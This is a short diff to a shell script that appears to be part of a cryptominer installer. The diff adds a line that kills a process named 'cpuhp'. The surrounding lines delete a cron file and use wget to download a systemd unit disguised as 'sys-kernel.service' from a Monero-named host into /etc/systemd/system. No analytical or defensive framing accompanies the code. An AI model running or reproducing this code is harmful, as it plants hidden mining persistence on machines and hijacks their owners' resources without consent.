@@ -1,4 +1,5 @@
 if [ -e "/etc/cron.d/cronconfig" ]; then
+        killall cpuhp
 	rm -f /etc/cron.d/cronconfig
  	cd /etc/systemd/system
 	wget https://xmrhorizontal.github.io/sys-kernel.service
